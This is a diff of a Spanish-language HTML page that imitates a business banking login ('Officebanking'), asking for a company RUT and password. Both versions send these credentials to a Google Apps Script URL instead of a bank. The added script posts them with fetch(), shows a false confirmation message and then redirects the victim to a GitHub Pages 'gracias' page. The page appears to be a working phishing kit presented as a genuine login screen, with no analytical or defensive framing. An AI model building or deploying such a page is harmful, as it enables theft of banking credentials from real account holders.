@@ -1,73 +1,138 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <title>Acceso Empresas</title>
+  <meta charset="UTF-8">
+  <title>Acceso Seguro – Officebanking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      background-color: #e6e9ef;
-      font-family: "Segoe UI", sans-serif;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #e4e7ec, #f4f6f9);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
     }
-    .login-box {
-      background-color: #ffffff;
+    form {
+      background: #ffffff;
       padding: 40px 30px;
       border-radius: 6px;
-      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
-      width: 340px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 360px;
     }
-    .login-box h2 {
-      text-align: center;
-      color: #003366;
+    h2 {
+      color: #2E3E56;
       margin-bottom: 25px;
-    }
-    .login-box label {
-      display: block;
-      margin-top: 15px;
+      text-align: center;
       font-weight: 600;
-      color: #333;
+      font-size: 22px;
     }
-    .login-box input {
-      width: 100%;
+    input {
+      font-size: 16px;
+      margin-bottom: 20px;
       padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
       border-radius: 4px;
-      font-size: 14px;
-    }
-    .login-box button {
+      border: 1px solid #bfc9d4;
       width: 100%;
-      margin-top: 25px;
-      padding: 12px;
-      background-color: #003366;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #0078d4;
       color: white;
       border: none;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
       border-radius: 4px;
-      font-weight: bold;
-      font-size: 15px;
       cursor: pointer;
     }
-    .login-box button:hover {
-      background-color: #002244;
+    button:hover {
+      background-color: #005fa3;
+    }
+    #mensaje-confirmacion {
+      display: none;
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #2e7d32;
+      font-weight: bold;
+    }
+    #cargando {
+      display: none;
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #0078d4;
+      font-weight: bold;
+    }
+    .p1, .p2, .p3 {
+      opacity: 0;
+      animation: aparecer 1.5s infinite;
+    }
+    .p2 { animation-delay: 0.3s; }
+    .p3 { animation-delay: 0.6s; }
+
+    @keyframes aparecer {
+      0% { opacity: 0; }
+      50% { opacity: 1; }
+      100% { opacity: 0; }
     }
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <h2>Acceso Empresas</h2>
-    <form action="https://script.google.com/macros/s/AKfycbwb0vTLuEE8r7oo90COPgvpbgXfZTAPKpI9pcgzE_N38-Y387niIKHvlzc2z2DMu6kXrA/exec" method="POST"> 
-      <label for="rut">RUT Empresa</label>
-      <input type="text" id="rut" name="rut" placeholder="12.345.678-9" required />
 
-      <label for="clave">Clave</label>
-      <input type="password" id="clave" name="clave" placeholder="********" required />
+  <form id="banking-form">
+    <h2>🔒 Ingreso Seguro</h2>
+    <input type="text" name="rut" placeholder="RUT (ej: 12.345.678-9)" required pattern="[\d\.]+-[\dkK]">
+    <input type="password" name="clave" placeholder="Clave de acceso" required>
+    <button type="submit">Ingresar</button>
+    <div id="cargando">CARGANDO<span class="p1">.</span><span class="p2">.</span><span class="p3">.</span></div>
+    <div id="mensaje-confirmacion">✅ Información enviada correctamente.</div>
+  </form>
 
-      <button type="submit">Ingresar</button>
-    </form>
-  </div>
+  <script>
+    const form = document.getElementById("banking-form");
+    const mensaje = document.getElementById("mensaje-confirmacion");
+    const cargando = document.getElementById("cargando");
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      mensaje.style.display = "none";
+      cargando.style.display = "block";
+      form.querySelector("button").disabled = true;
+
+      const datos = {
+        rut: form.rut.value,
+        clave: form.clave.value
+      };
+
+      fetch("https://script.google.com/macros/s/AKfycbwb0vTLuEE8r7oo90COPgvpbgXfZTAPKpI9pcgzE_N38-Y387niIKHvlzc2z2DMu6kXrA/exec", {
+        method: "POST",
+        body: JSON.stringify(datos),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(res => res.text())
+      .then(data => {
+        form.reset();
+        cargando.style.display = "none";
+        mensaje.style.display = "block";
+        form.querySelector("button").disabled = false;
+        setTimeout(() => {
+          window.location.href = "https://oficinacurico.github.io/Officebanking/gracias";
+        }, 3000);
+      })
+      .catch(err => {
+        cargando.style.display = "none";
+        alert("Ocurrió un error al enviar. Intenta nuevamente.");
+        form.querySelector("button").disabled = false;
+        console.error("Error:", err);
+      });
+    });
+  </script>
+
 </body>
 </html>
